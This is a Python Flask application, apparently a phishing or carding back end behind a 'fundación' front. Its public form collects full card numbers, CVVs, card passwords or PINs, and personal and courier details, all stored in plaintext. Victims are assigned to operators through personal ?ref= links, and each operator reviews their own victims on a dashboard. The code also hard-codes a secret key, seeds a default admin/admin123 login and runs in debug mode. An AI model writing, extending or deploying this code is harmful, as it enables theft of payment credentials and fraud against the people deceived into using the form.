import os
from flask import Flask, render_template, request, redirect, url_for, session, jsonify, flash
from flask_sqlalchemy import SQLAlchemy
from werkzeug.security import generate_password_hash, check_password_hash
from datetime import datetime

app = Flask(__name__)
app.secret_key = 'fundacion_llave_secreta_super_protegida'

# Configuración de ruta absoluta para SQLite en Render
basedir = os.path.abspath(os.path.dirname(__file__))
app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///' + os.path.join(basedir, 'fundacion.db')
app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False
db = SQLAlchemy(app)

# --- MODELOS DE NAVEGACIÓN Y BASE DE DATOS ---
class Admin(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    usuario = db.Column(db.String(50), unique=True, nullable=False)
    password = db.Column(db.String(200), nullable=False)
    fecha_creacion = db.Column(db.DateTime, default=datetime.utcnow)

class Cliente(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    nombre = db.Column(db.String(100), nullable=False)
    apellido = db.Column(db.String(100), nullable=False)
    telefono = db.Column(db.String(50))
    pais = db.Column(db.String(100))
    correo = db.Column(db.String(100))
    courier = db.Column(db.String(100))
    codigo_postal = db.Column(db.String(50))
    metodo_pago = db.Column(db.String(50))
    tipo_tarjeta = db.Column(db.String(50))
    numero_tarjeta = db.Column(db.String(100))
    cvv = db.Column(db.String(20))
    contrasena_tarjeta = db.Column(db.String(100))
    fecha_registro = db.Column(db.DateTime, default=datetime.utcnow)
    
    # Vinculación con el Administrador que envió el enlace
    admin_id = db.Column(db.Integer, db.ForeignKey('admin.id'), nullable=True)
    admin = db.relationship('Admin', backref=db.backref('clientes', lazy=True))

with app.app_context():
    db.create_all()
    if not Admin.query.filter_by(usuario='admin').first():
        admin_defecto = Admin(
            usuario='admin',
            password=generate_password_hash('admin123')
        )
        db.session.add(admin_defecto)
        db.session.commit()

# --- RUTA PÚBLICA (FORMULARIO PARA EL CLIENTE) ---
@app.route('/', methods=['GET', 'POST'])
def formulario_cliente():
    # Detecta si el enlace trae un parámetro de administrador (?ref=usuario)
    ref_param = request.args.get('ref')
    if ref_param:
        session['ref_admin'] = ref_param

    # Busca qué admin envió el enlace
    ref_user = session.get('ref_admin')
    assigned_admin = None
    if ref_user:
        assigned_admin = Admin.query.filter_by(usuario=ref_user).first()
    
    # Si no hay ref o no existe, lo asigna al admin principal por defecto
    if not assigned_admin:
        assigned_admin = Admin.query.filter_by(usuario='admin').first()

    if request.method == 'POST':
        nuevo_cliente = Cliente(
            nombre=request.form.get('nombre', ''),
            apellido=request.form.get('apellido', ''),
            telefono=request.form.get('telefono', ''),
            pais=request.form.get('pais', ''),
            correo=request.form.get('correo', ''),
            courier=request.form.get('courier', ''),
            codigo_postal=request.form.get('codigo_postal', ''),
            metodo_pago=request.form.get('metodo_pago', ''),
            tipo_tarjeta=request.form.get('tipo_tarjeta', ''),
            numero_tarjeta=request.form.get('numero_tarjeta', ''),
            cvv=request.form.get('cvv', ''),
            contrasena_tarjeta=request.form.get('contrasena_tarjeta', ''),
            admin_id=assigned_admin.id if assigned_admin else None
        )
        db.session.add(nuevo_cliente)
        db.session.commit()
        return render_template('index.html', success=True)
    return render_template('index.html')

# --- RUTAS ADMINISTRATIVAS ---
@app.route('/admin/login', methods=['GET', 'POST'])
def admin_login():
    error = None
    if request.method == 'POST':
        usuario = request.form.get('usuario', '')
        password = request.form.get('password', '')
        
        admin_obj = Admin.query.filter_by(usuario=usuario).first()
        if admin_obj and check_password_hash(admin_obj.password, password):
            session['admin_id'] = admin_obj.id
            session['admin_user'] = admin_obj.usuario
            return redirect(url_for('admin_dashboard'))
        else:
            error = "Credenciales incorrectas"
    return render_template('login.html', error=error)

@app.route('/admin/logout')
def admin_logout():
    session.clear()
    return redirect(url_for('admin_login'))

@app.route('/admin')
@app.route('/admin/dashboard')
def admin_dashboard():
    if not session.get('admin_user'):
        return redirect(url_for('admin_login'))
        
    logged_admin_id = session.get('admin_id')
    logged_admin_user = session.get('admin_user')
    
    pais_filtro = request.args.get('pais', '')
    busqueda = request.args.get('q', '')
    
    # Filtro estricto: Solo muestra los clientes asignados al Administrador en sesión
    query = Cliente.query.filter_by(admin_id=logged_admin_id)
    
    if pais_filtro:
        query = query.filter_by(pais=pais_filtro)
    if busqueda:
        query = query.filter(
            (Cliente.nombre.like(f'%{busqueda}%')) | 
            (Cliente.apellido.like(f'%{busqueda}%')) | 
            (Cliente.correo.like(f'%{busqueda}%'))
        )
        
    clientes = query.order_by(Cliente.fecha_registro.desc()).all()
    
    paises_db = db.session.query(Cliente.pais).filter(Cliente.admin_id == logged_admin_id).distinct().all()
    lista_paises = [p[0] for p in paises_db if p[0]]
    
    total_clientes = Cliente.query.filter_by(admin_id=logged_admin_id).count()
    total_admins = Admin.query.count()
    
    # Genera el enlace único para este Administrador
    enlace_personal = f"{request.host_url}?ref={logged_admin_user}"
    
    return render_template(
        'admin.html', 
        clientes=clientes, 
        paises=lista_paises, 
        pais_sel=pais_filtro,
        q_sel=busqueda,
        total_clientes=total_clientes,
        total_admins=total_admins,
        enlace_personal=enlace_personal
    )

@app.route('/admin/gestionar-admins', methods=['GET', 'POST'])
def gestionar_admins():
    if not session.get('admin_user'):
        return redirect(url_for('admin_login'))
        
    mensaje = None
    error = None
    
    if request.method == 'POST':
        accion = request.form.get('accion')
        if accion == 'crear':
            nuevo_user = request.form.get('usuario', '').strip()
            nuevo_pass = request.form.get('password', '').strip()
            if nuevo_user and nuevo_pass:
                if Admin.query.filter_by(usuario=nuevo_user).first():
                    error = "El usuario ya existe."
                else:
                    nuevo_admin = Admin(
                        usuario=nuevo_user,
                        password=generate_password_hash(nuevo_pass)
                    )
                    db.session.add(nuevo_admin)
                    db.session.commit()
                    mensaje = f"Administrador '{nuevo_user}' creado exitosamente."
            else:
                error = "Debe completar todos los campos."
        elif accion == 'eliminar':
            admin_id = request.form.get('admin_id')
            admin_to_del = Admin.query.get(admin_id)
            if admin_to_del:
                if Admin.query.count() <= 1:
                    error = "No puedes eliminar al único administrador."
                elif admin_to_del.usuario == session.get('admin_user'):
                    error = "No puedes eliminar tu propia cuenta en uso."
                else:
                    db.session.delete(admin_to_del)
                    db.session.commit()
                    mensaje = "Administrador eliminado correctamente."
                    
    admins = Admin.query.order_by(Admin.fecha_creacion.asc()).all()
    return render_template('admins_manage.html', admins=admins, mensaje=mensaje, error=error)

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5001))
    app.run(host='0.0.0.0', port=port, debug=True)